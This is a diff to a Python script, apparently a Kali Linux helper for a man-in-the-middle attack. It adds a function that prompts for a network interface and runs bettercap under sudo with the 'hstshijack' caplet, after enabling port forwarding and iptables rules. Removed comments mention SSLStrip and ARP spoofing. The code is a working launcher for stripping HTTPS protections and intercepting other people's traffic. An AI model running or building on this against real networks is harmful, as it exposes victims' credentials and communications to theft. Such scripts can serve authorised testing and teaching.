@@ -43,17 +43,37 @@ def set_iptables():
 	# return the number to set in the queue call
 	return number
 
+def start_bettercap():
+	try:
+		interface = None
+		yes_choice = {'yes', 'y'}
+		no_choice = {'no', 'n'}
+
+		print("[+] Starting Bettercap...")
+		print("[+] eth0 is the default first wired interface in Kali Linux")
+		user_input = input("[+] Is this an acceptable interface to use? y/n ").lower().strip()
+		if user_input in yes_choice:
+			interface = "eth0"
+		if user_input in no_choice:
+			interface = input("[+] Please provide an interface to use: ").lower().strip()
+		print("[+] Interface selected is: ", interface)
+		print("[+] Request, set bettercap iface to: " + interface)
+		subprocess.call(["sudo", "bettercap", "-iface", interface, "-caplet", "hstshijack/hstshijack"])
+
+	except Exception as e:
+		print("[-] Something went wrong while starting Bettercap: ", e)
+
+	except KeyboardInterrupt:
+		print("\n[-] Ctrl-C detected. Shutting down... ")
+		exit()
+
 print("[+] Setting up environment...")
+
 # 1. Enable Port Forwarding.
 enable_port_forwarding()
+
 # 2. Set IP Tables
 set_iptables()
 
-	# 4. Call SSLStrip using Bettercap
-
-# B. On EXIT
-	# 1. Disable port forwarding
-	# 2. Flush iptables
-	# 3. Shutdown ARP Spoof
-	# 4. Shutdown Bettercap
-	# 5. Say bye bye and laters
+# 3. Start Bettercap
+start_bettercap()
